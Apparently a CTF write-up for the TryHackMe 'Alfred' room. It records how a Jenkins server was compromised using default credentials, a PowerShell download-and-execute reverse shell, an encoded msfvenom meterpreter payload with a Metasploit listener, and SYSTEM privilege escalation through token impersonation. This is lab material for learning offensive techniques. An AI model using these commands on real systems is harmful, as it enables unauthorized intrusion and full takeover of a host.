# Link

- https://tryhackme.com/room/alfred

# Info

## IP = $IP

## Creds

- alfred@wayneenterprises.com
- admin:admin (Jenkins login)

# Ports

## PortScanning
```bash
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

## 80

###  `gobuster`

## 8080

- login page

## script console used for reverse shell
- https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
- http://$IP:8080/job/project/
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://$IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $IP -Port 1337
```
# PrivEsc

- using `msfvenom` to create reverse shell file
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$IP LPORT=1234 -f exe -o shell-name.exe
``` 

- open listener in `msfconsole`
```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST $IP
LHOST => $IP
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run
```

- open http server in python
```bash
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/Alfred]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- get file from target machine
```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://$IP:8000/shell-name.exe','shell-name.exe')"
```

- run file from target machine
```powershell
Start-Process "shell-name.exe"
```

- checking permissions with `whoami /priv`, it's possible to check "SeDebugPrivilege" and "SeImpersonatePrivilege" privileges enabled, so...
```bash
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid # NT AUTHORITY\SYSTEM
```
- trade process
```bash
pgrep services.exe
migrate 668
```

- get root flag at **C:\Windows\System32\config**